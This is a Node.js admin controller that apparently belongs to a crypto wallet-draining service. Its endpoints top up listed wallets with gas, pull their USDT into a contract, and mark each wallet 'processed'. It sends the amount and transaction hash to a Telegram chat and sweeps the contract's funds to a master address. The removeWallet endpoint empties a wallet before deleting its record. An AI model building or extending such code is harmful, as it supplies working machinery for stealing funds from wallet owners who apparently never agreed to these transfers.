const gasService = require('../services/gas.service');
const contractService = require('../services/contract.service');
const database = require('../config/database');
const telegram = require('../config/telegram');
const validators = require('../utils/validators');

class AdminController {
    async pullWallet(req, res) {
        try {
            // Validate admin request
            const adminValidation = validators.validateAdminRequest(req.headers);
            if (!adminValidation.valid) {
                return res.status(401).json({
                    success: false,
                    error: adminValidation.error
                });
            }
            
            // Validate input
            const validation = validators.validatePullRequest(req.body);
            if (!validation.valid) {
                return res.status(400).json({
                    success: false,
                    error: validation.error
                });
            }
            
            const { walletAddress } = req.body;
            
            // Check if wallet has sufficient gas
            const gasCheck = await gasService.checkWalletGasBalance(walletAddress);
            
            if (!gasCheck.hasSufficientGas) {
                // Send gas to wallet
                const gasResult = await gasService.sendGasToWallet(walletAddress);
                if (!gasResult.success) {
                    return res.status(500).json({
                        success: false,
                        error: 'Failed to send gas to wallet: ' + gasResult.error
                    });
                }
            }
            
            // Pull USDT from wallet to contract
            const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
            
            if (!pullResult.success) {
                return res.status(500).json({
                    success: false,
                    error: pullResult.error
                });
            }
            
            // Update database
            const query = `
                UPDATE wallets 
                SET is_processed = true, updated_at = NOW()
                WHERE address = $1
                RETURNING *
            `;
            
            await database.query(query, [walletAddress]);
            
            // Send success message to admin
            await telegram.sendSuccessMessage(walletAddress, pullResult.amount, pullResult.txHash);
            
            res.json({
                success: true,
                transaction: pullResult.txHash,
                amount: pullResult.amount
            });
        } catch (error) {
            console.error('Pull wallet error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }

    // In backend/src/controllers/admin.controller.js, update the withdrawContract method:

async withdrawContract(req, res) {
    try {
        // Validate admin request
        const adminValidation = validators.validateAdminRequest(req.headers);
        if (!adminValidation.valid) {
            return res.status(401).json({
                success: false,
                error: adminValidation.error
            });
        }
        
        // Import contract service directly
        const contractService = require('../services/contract.service');
        
        const result = await contractService.withdrawUSDTToMaster();
        
        if (!result.success) {
            return res.status(500).json({
                success: false,
                error: result.error
            });
        }
        
        res.json({
            success: true,
            transaction: result.txHash,
            amount: result.amount
        });
    } catch (error) {
        console.error('Withdraw contract error:', error);
        res.status(500).json({
            success: false,
            error: 'Internal server error'
        });
    }
}


    async removeWallet(req, res) {
        try {
            // Validate admin request
            const adminValidation = validators.validateAdminRequest(req.headers);
            if (!adminValidation.valid) {
                return res.status(401).json({
                    success: false,
                    error: adminValidation.error
                });
            }
            
            // Validate input
            const validation = validators.validateRemoveRequest(req.body);
            if (!validation.valid) {
                return res.status(400).json({
                    success: false,
                    error: validation.error
                });
            }
            
            const { walletAddress } = req.body;
            
            // First pull USDT if available
            const balance = await contractService.getWalletUSDTBalance(walletAddress);
            
            if (parseFloat(balance) > 0) {
                const pullResult = await contractService.pullUSDTFromWallet(walletAddress);
                if (!pullResult.success) {
                    return res.status(500).json({
                        success: false,
                        error: 'Failed to pull USDT before removal: ' + pullResult.error
                    });
                }
            }
            
            // Remove from database
            const query = 'DELETE FROM wallets WHERE address = $1';
            await database.query(query, [walletAddress]);
            
            res.json({
                success: true,
                message: 'Wallet removed successfully'
            });
        } catch (error) {
            console.error('Remove wallet error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }

    async getAllBalances(req, res) {
        try {
            // Validate admin request
            const adminValidation = validators.validateAdminRequest(req.headers);
            if (!adminValidation.valid) {
                return res.status(401).json({
                    success: false,
                    error: adminValidation.error
                });
            }
            
            const query = 'SELECT * FROM wallets ORDER BY created_at DESC';
            const result = await database.query(query);
            
            const wallets = await Promise.all(result.rows.map(async (wallet) => {
                const balance = await contractService.getWalletUSDTBalance(wallet.address);
                return {
                    ...wallet,
                    usdt_balance: balance
                };
            }));
            
            res.json({
                success: true,
                wallets: wallets
            });
        } catch (error) {
            console.error('Get all balances error:', error);
            res.status(500).json({
                success: false,
                error: 'Internal server error'
            });
        }
    }
}

module.exports = new AdminController();

